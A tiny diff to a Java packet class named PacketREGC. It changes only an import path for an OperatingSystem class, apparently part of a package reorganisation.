@@ -1,7 +1,7 @@
 package com.redpois0n.packets;
 
 import com.redpois0n.Connection;
-import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.common.OperatingSystem;
 
 public class PacketREGC extends AbstractPacket {
 
